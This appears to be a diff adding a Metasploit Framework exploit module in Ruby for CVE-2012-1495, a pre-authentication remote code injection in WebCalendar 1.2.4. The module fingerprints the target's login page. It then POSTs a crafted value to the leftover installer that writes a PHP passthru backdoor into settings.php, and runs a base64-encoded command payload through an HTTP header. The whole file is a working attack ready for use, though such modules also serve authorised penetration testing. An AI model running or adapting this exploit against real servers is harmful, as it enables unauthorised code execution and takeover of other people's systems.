@@ -1,0 +1,105 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+#   http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info={})
+		super(update_info(info,
+			'Name'           => "WebCalendar 1.2.4 Pre-Auth Remote Code Injection",
+			'Description'    => %q{
+					This modules exploits a vulnerability found in WebCalendar, version 1.2.4 or
+				less.  If not removed, the settings.php script meant for installation can be
+				update by an attacker, and then inject code in it.  This allows arbitrary code
+				execution as www-data.
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         =>
+				[
+					'EgiX',   #Initial discovery & PoC
+					'sinn3r'  #Metasploit
+				],
+			'References'     =>
+				[
+					['CVE', '2012-1495'],
+					['URL', '18775']
+				],
+			'Arch'           => ARCH_CMD,
+			'Platform'       => ['unix', 'linux'],
+			'Compat'         =>
+				{
+					'PayloadType' => 'cmd'
+				},
+			'Targets'        =>
+				[
+					['WebCalendar 1.2.4 on Linux', {}],
+				],
+			'Privileged'     => false,
+			'DisclosureDate' => "Apr 23 2012",
+			'DefaultTarget'  => 0))
+
+			register_options(
+				[
+					OptString.new('TARGETURI', [true, 'The URI path to webcalendar', '/WebCalendar-1.2.4/'])
+				], self.class)
+	end
+
+	def check
+		uri = target_uri.path
+		uri << '/' if uri[-1, 1] != '/'
+
+		res = send_request_raw({
+			'method' => 'GET',
+			'uri'    => "#{uri}/login.php"
+		})
+
+		if res and res.body =~ /WebCalendar v1.2.\d/
+			return Exploit::CheckCode::Vulnerable
+		else
+			return Exploit::CheckCode::Safe
+		end
+	end
+
+
+	def exploit
+		peer = "#{rhost}:#{rport}"
+
+		uri = target_uri.path
+		uri << '/' if uri[-1, 1] != '/'
+
+		print_status("#{peer} - Housing php payload...")
+
+		# Allow commands to be passed as a header.
+		# We use 'data' instead of 'vars_post to avoid the MSF API escapeing our stuff.
+		post_data  = "app_settings=1"
+		post_data << "&form_user_inc=user.php"
+		post_data << "&form_single_user_login=*/print(____);passthru(base64_decode($_SERVER[HTTP_CMD]));die;"
+		post_data << "\n"*2
+		send_request_cgi({
+			'method'    => 'POST',
+			'uri'       => "#{uri}install/index.php",
+			'data'      => post_data
+		})
+
+		print_status("#{peer} - Loading our payload...")
+
+		# Execute our payload
+		send_request_raw({
+			'method' => 'GET',
+			'uri'    => "#{uri}includes/settings.php",
+			'headers' => {
+				'Cmd' => Rex::Text.encode_base64(payload.encoded)
+			}
+		})
+
+		handler
+	end
+end
